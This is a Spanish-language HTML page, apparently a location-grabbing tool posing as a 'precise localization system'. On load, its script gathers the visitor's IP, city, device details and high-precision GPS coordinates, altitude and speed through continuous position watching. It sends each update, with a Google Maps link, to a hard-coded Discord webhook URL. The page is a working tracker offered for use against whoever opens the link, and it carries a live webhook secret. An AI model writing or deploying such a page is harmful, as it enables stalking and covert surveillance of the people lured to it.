<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔍 Sistema de Localización Avanzada</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: #0a0a0a; 
            color: #00ff00; 
            text-align: center; 
            padding: 40px; 
            margin: 0;
        }
        h1 { color: #00ff41; text-shadow: 0 0 10px #00ff41; }
        #resultado { 
            margin: 30px auto; 
            max-width: 800px; 
            background: #111; 
            padding: 20px; 
            border: 1px solid #00ff00; 
            border-radius: 8px; 
            text-align: left; 
            font-size: 16px;
            line-height: 1.6;
        }
        .loading { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
    </style>
</head>
<body>
    <h1>⚡ SISTEMA DE LOCALIZACIÓN PRECISA ACTIVADO</h1>
    <p>Obteniendo máxima información posible...</p>
    
    <div id="resultado" class="loading">🔄 Iniciando escaneo...</div>

    <script>
        // Tu webhook ya incluido
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491850169660997783/J12g-R-0nyXPFr4-Uu0WpYXZAFoQmUJfyt5O6JHA79ke5gwx8OM1v1mgIaLMnSe1y18y";

        let allData = {};

        async function obtenerTodo() {
            const resultado = document.getElementById('resultado');
            resultado.innerHTML = "🔄 Escaneando GPS + IP + Dispositivo...";

            // Información básica del dispositivo
            allData = {
                timestamp: new Date().toLocaleString('es-ES'),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                online: navigator.onLine,
                referrer: document.referrer || "Directo"
            };

            // Geolocalización por IP (respaldo)
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                allData.ip = ipData.ip;
                allData.ipCity = ipData.city || "N/A";
                allData.ipRegion = ipData.region || "N/A";
                allData.ipCountry = ipData.country_name || "N/A";
            } catch (e) {
                allData.ip = "No disponible";
            }

            // GPS con máxima precisión
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(
                    (position) => {
                        allData.gpsLat = position.coords.latitude.toFixed(8);
                        allData.gpsLon = position.coords.longitude.toFixed(8);
                        allData.gpsAccuracy = Math.round(position.coords.accuracy) + " metros";
                        allData.gpsAltitude = position.coords.altitude ? position.coords.altitude.toFixed(1) + " m" : "N/A";
                        allData.gpsSpeed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + " km/h" : "N/A";

                        mostrarEnPantalla();
                        enviarADiscord();
                    },
                    (error) => {
                        resultado.innerHTML += "<br>❌ GPS denegado o no disponible. Mostrando solo datos de IP.";
                        mostrarEnPantalla();
                        enviarADiscord();
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                mostrarEnPantalla();
                enviarADiscord();
            }
        }

        function mostrarEnPantalla() {
            const res = document.getElementById('resultado');
            res.classList.remove('loading');
            res.innerHTML = `
                <strong>✅ Datos recolectados:</strong><br><br>
                🕒 Hora: ${allData.timestamp}<br>
                🌐 IP: <strong>${allData.ip || 'N/A'}</strong><br>
                📍 Ubicación aproximada (IP): ${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}<br>
                ${allData.gpsLat ? `
                📍 <strong>GPS Latitud:</strong> ${allData.gpsLat}<br>
                📍 <strong>GPS Longitud:</strong> ${allData.gpsLon}<br>
                🎯 Precisión: <strong>${allData.gpsAccuracy}</strong><br>
                ⬆️ Altitud: <strong>${allData.gpsAltitude}</strong><br>
                ⚡ Velocidad: <strong>${allData.gpsSpeed}</strong>` : ''}
            `;
        }

        async function enviarADiscord() {
            const mapsLink = allData.gpsLat 
                ? `https://www.google.com/maps?q=${allData.gpsLat},${allData.gpsLon}` 
                : "#";

            const embed = {
                title: "🔴 NUEVA UBICACIÓN DETECTADA",
                color: 0x00ff00,
                fields: [
                    { name: "🕒 Hora", value: allData.timestamp, inline: false },
                    { name: "🌐 IP", value: `\`${allData.ip || 'N/A'}\``, inline: true },
                    { name: "📍 Ciudad/Región", value: `${allData.ipCity || ''}, ${allData.ipRegion || ''}`, inline: true },
                    allData.gpsLat ? { name: "📍 GPS Lat / Lon", value: `\`${allData.gpsLat}\` / \`${allData.gpsLon}\``, inline: false } : null,
                    allData.gpsAccuracy ? { name: "🎯 Precisión GPS", value: allData.gpsAccuracy, inline: true } : null,
                    { name: "🔗 Google Maps", value: `[Abrir en Maps](${mapsLink})`, inline: false }
                ].filter(Boolean),
                footer: { text: "Sistema de localización avanzada" },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: "**Nueva captura de ubicación**", embeds: [embed] })
                });
            } catch (err) {}
        }

        // Iniciar automáticamente al cargar la página
        window.onload = obtenerTodo;
    </script>
</body>
</html>
